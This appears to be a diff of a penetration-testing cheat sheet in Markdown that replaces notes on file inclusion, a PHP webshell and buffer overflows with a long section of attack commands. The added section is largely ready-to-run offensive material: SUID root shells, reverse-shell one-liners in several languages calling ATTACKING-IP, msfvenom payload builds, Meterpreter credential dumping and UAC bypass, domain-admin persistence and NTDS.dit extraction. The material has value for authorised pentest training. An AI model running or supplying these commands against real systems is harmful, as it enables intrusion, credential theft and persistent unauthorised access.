@@ -806,7 +806,7 @@ powershell ls "\\dc01\pipe\spoolss"
     
 # Scanning done
 
-# Gaining Access
+# Gaining Access start
 
 - hydra: bruteforce tool
 
@@ -918,125 +918,540 @@ powershell ls "\\dc01\pipe\spoolss"
     ```bash
     responder -I eth0 -rdwv #Run Responder.py for the length of the engagement while you're working on other attack vectors.
 
-## Local File Inclusion
-`http://[IP]/index.php?file=php://filter/convert.base64-encode/resource=index.php`
 
-Get the contents of all PHP files in base64 without executing them. 
+# Gaining access done
 
-`<?php echo passthru($_GET['cmd']); ?>`
+# **Shells & Reverse Shells**
 
-PHP Webshell
+## **SUID C Shells**
 
-## Upgrade Shell
+- bin/bash:
 
-`python -c'import pty; pty.spawn("/bin/bash")'`
+```
+int main(void){
 
-Background Session with `ctrl + z`
+setresuid(0, 0, 0);
 
-`stty raw -echo`
+system("/bin/bash");
 
-`stty -a`
+}
+```
 
-get row & col
+- bin/sh:
 
-`stty rows X columns Y`
+```
+int main(void){
 
-Set rows and cols
+setresuid(0, 0, 0);
 
-Foreground Session again
+system("/bin/sh");
 
-`fg #jobnumber`
+}
+```
 
-`export XTERM=xterm-color`
+### **TTY Shell:**
 
-enable clear
-## Add Account/Password to /etc/passwd
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")' #Python TTY Shell Trick
+```
 
-Generate password
+```bash
+echo os.system('/bin/bash')
+```
 
-`openssl passwd -1 -salt [Username] [PASSWD]`
+```bash
+/bin/sh –i #Spawn Interactive sh shell
+```
 
-Then Add to passwd file
+```bash
+execute('/bin/sh')
+```
 
-`Username:generated password:UID:GUID:root:/root:/bin/bash`
+- LUA
 
-## SQLMap 
+```bash
+!sh
+```
 
-Capture Request with Burp.
+- Privilege Escalation via nmap
 
-Save Request to File.
+```bash
+:!bash
+```
 
-`sqlmap -r [REQUEST] --level [X] --risk [Y]`
+- Privilege escalation via vi
 
-## Use SSH Key
+### Fully Interactive TTY
 
-Download & save
+```
+                                In reverse shell 
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+                                In Attacker console
+stty -a
+stty raw -echo
+fg
+                                In reverse shell
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <cols>
+```
 
-It is necessary to change the permissions on the key file otherwise you have to enter a password!
+### **Spawn Ruby Shell**
 
-`chmod 600 [KEY]`
+```bash
+exec "/bin/sh"
+```
 
-`ssh -i [KEY] [IP]`
+```bash
+ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
+```
 
-## Searchsploit
+### **Netcat**
 
-`searchsploit [TERM]`
+```bash
+nc -e /bin/sh ATTACKING-IP 80
+```
 
-`searchsploit -m exploits/solaris/local/19232.txt`
+```bash
+/bin/sh | nc ATTACKING-IP 80
+```
 
-Copy to local directory
+```bash
+rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
+```
 
-## Convert RPM Package to deb
+### **Telnet Reverse Shell**
 
-`alien [Pakage.rpm]`
+```bash
+rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+```
 
-## Bufferoverflows
+```bash
+telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+```
 
-Locate Overflow
+### **PHP**
 
-`patter_create.rb -l [SIZE]`
+```bash
+php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 
-Start gdb and run 
+- (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
 
-`r [PATTERN]`
+### **Bash**
 
-Copy the segfault String
+```bash
+exec /bin/bash 0&0 2>&0
+```
 
-`pattern_offset.rb [SEGFAULT STRING]`
+```bash
+0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
+```
 
-Receive Match at exact offset X.
+```bash
+exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done
+```
 
-Now you know you have at X the EIP override and so much space in the buffer.
+```bash
+# or: while read line 0<&5; do $line 2>&5 >&5; done
+```
 
-## Simple exploit developement
+```bash
+bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
+```
 
-Get Information about the binary. 
+### **Perl**
 
-`checksec [Binary]`
+```bash
+exec "/bin/sh";
+```
 
-Search [packetstrom](https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html) for Shellcode.
+```bash
+perl —e 'exec "/bin/sh";'
+```
 
-Remember to use correct architecture.
+```bash
+perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
-## Work in progress above...
+```bash
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
 
-## SNMP
+- Windows
 
-Bruteforce community string
+```bash
+perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
-`nmap -sU -p 161 [IP] -Pn --script=snmp-brute`
+- 
 
-`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt [IP]`
+# Meterpreter (Metasploit) ([cheet sheet](https://www.tunnelsup.com/metasploit-cheat-sheet/))
 
-Community String is in both cases "private"
+### **Windows reverse meterpreter payload**
 
-`snmp-check [IP] -c public`
+```bash
+set payload windows/meterpreter/reverse_tcp
+```
 
-`snmpwalk -c public [IP] -v 2c`
+- Windows reverse tcp payload
 
+### **Windows VNC Meterpreter payload**
 
+```bash
+set payload windows/vncinject/reverse_tcpf
+```
 
+- Meterpreter Windows VNC Payload
 
+```bash
+set ViewOnly false
+```
+
+### **Linux Reverse Meterpreter payload**
+
+```bash
+set payload linux/meterpreter/reverse_tcp
+```
+
+- Meterpreter Linux Reverse Payload
+
+### **Meterpreter Cheat Sheet**
+
+```bash
+upload file c:\\windows
+```
+
+- Meterpreter upload file to Windows target
+
+```bash
+download c:\\windows\\repair\\sam /tmp
+```
+
+- Meterpreter download file from Windows target
+
+```bash
+download c:\\windows\\repair\\sam /tmp
+```
+
+- Meterpreter download file from Windows target
+
+```bash
+execute -f c:\\windows\temp\exploit.exe
+```
+
+- Meterpreter run .exe on target – handy for executing uploaded exploits
+
+```bash
+execute -f cmd -c
+```
+
+- Creates new channel with cmd shell
+
+```bash
+ps
+```
+
+- Meterpreter show processes
+
+```bash
+shell
+```
+
+- Meterpreter get shell on the target
+
+```bash
+getsystem
+```
+
+- Meterpreter attempts priviledge escalation the target
+
+```bash
+hashdump
+```
+
+- Meterpreter attempts to dump the hashes on the target (must have privileges; try migrating to winlogon.exe if possible first)
+
+```bash
+portfwd add –l 3389 –p 3389 –r target
+```
+
+- Meterpreter create port forward to target machine
+
+```bash
+portfwd delete –l 3389 –p 3389 –r target
+```
+
+- Meterpreter delete port forward
+
+```bash
+use exploit/windows/local/bypassuac
+```
+
+- Bypass UAC on Windows 7 + Set target + arch, x86/64
+
+```bash
+use auxiliary/scanner/http/dir_scanner
+```
+
+- Metasploit HTTP directory scanner
+
+```bash
+use auxiliary/scanner/http/jboss_vulnscan
+```
+
+- Metasploit JBOSS vulnerability scanner
+
+```bash
+use auxiliary/scanner/mssql/mssql_login
+```
+
+- Metasploit MSSQL Credential Scanner
+
+```bash
+use auxiliary/scanner/mysql/mysql_version
+```
+
+- Metasploit MSSQL Version Scanner
+
+```bash
+use auxiliary/scanner/oracle/oracle_login
+```
+
+- Metasploit Oracle Login Module
+
+```bash
+use exploit/multi/script/web_delivery
+```
+
+- Metasploit powershell payload delivery module
+
+```bash
+post/windows/manage/powershell/exec_powershell
+```
+
+- Metasploit upload and run powershell script through a session
+
+```bash
+use exploit/multi/http/jboss_maindeployer
+```
+
+- Metasploit JBOSS deploy
+
+```bash
+use exploit/windows/mssql/mssql_payload
+```
+
+- Metasploit MSSQL payload
+
+```bash
+run post/windows/gather/win_privs
+```
+
+- Metasploit show privileges of current user
+
+```bash
+use post/windows/gather/credentials/gpp
+```
+
+- Metasploit grab GPP saved passwords
+
+```bash
+load kiwi
+```
+
+```bash
+creds_all
+```
+
+- Metasploit load Mimikatz/kiwi and get creds
+
+```bash
+run post/windows/gather/local_admin_search_enum
+```
+
+- Idenitfy other machines that the supplied domain user has administrative access to
+
+```bash
+set AUTORUNSCRIPT post/windows/manage/migrate
+```
+
+### **Meterpreter Payloads**
+
+```bash
+msfvenom –l
+```
+
+- List options
+
+### **Binaries**
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
+```
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
+```
+
+```bash
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
+```
+
+### **Web Payloads**
+
+```bash
+msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php
+```
+
+- PHP
+
+```bash
+set payload php/meterpreter/reverse_tcp
+```
+
+- Listener
+
+```bash
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+```
+
+- PHP
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
+```
+
+- ASP
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
+```
+
+- JSP
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
+```
+
+- WAR
+
+### **Scripting Payloads**
+
+```bash
+msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
+```
+
+- Python
+
+```bash
+msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
+```
+
+- Bash
+
+```bash
+msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
+```
+
+- Perl
+
+### **Shellcode**
+
+For all shellcode see ‘msfvenom –help-formats’ for information as to
+valid parameters. Msfvenom will output code that is able to be cut and
+pasted in this language for your exploits.
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
+```
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
+```
+
+```bash
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
+```
+
+### **Handlers**
+
+Metasploit handlers can be great at quickly setting up Metasploit to
+be in a position to receive your incoming shells. Handlers should be in
+the following format.
+
+```
+exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false exploit -j -z
+```
+
+An example is:
+
+```
+msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension
+```
+
+# **Powershell**
+
+**Execution Bypass**
+
+```bash
+Set-ExecutionPolicy Unrestricted
+./file.ps1
+```
+
+```bash
+Import-Module script.psm1
+Invoke-FunctionThatIsIntheModule
+```
+
+```bash
+iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)
+```
+
+**Powershell.exe blocked**
+
+```bash
+Use ‘not powershell’ [https://github.com/Ben0xA/nps](https://github.com/Ben0xA/nps)
+```
+
+**Persistence**
+
+```bash
+net user username "password" /ADD
+```
+
+```bash
+net group "Domain Admins" %username% /DOMAIN /ADD
+```
+
+**Gather NTDS.dit file**
+
+```bash
+ntdsutil
+```
+
+```bash
+activate instance ntds
+```
+
+```bash
+ifm
+```
+
+```bash
+create full C:\ntdsutil
+```
+
+```bash
+quit
+```
+
+```bash
+quit
+```
+# **Shells & Reverse Shells** done
 
 ## curl
 
@@ -1336,28 +1751,6 @@ a72adf8a7a08d7939550c244b237c72c7d4236754<br>
   # Hash crack(password crack) done
   
   
-## FTP
-
-`wget -r ftp://user:pass@server.com/`
-
-Recursively download with ftp.
-
-## SMB Null Session
-
-`smbclient //10.10.10.X/IPC$ -W Workgroup -I 10.10.10.X -U ""`
-
-
-## WFUZZ 
-
-`wfuzz -z range,1-65600 --hc 500  "http://IP:PORT/dir?parameter=id&port=FUZZ"`
-
-Fuzz a range of ids/port numbers.
-
-
-## Wordlist with crunch
-
-`crunch 15 15 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ*?=walkthrough%&0123456789" -t 123456789012345@ > wordlist.txt
-`
 
   
   
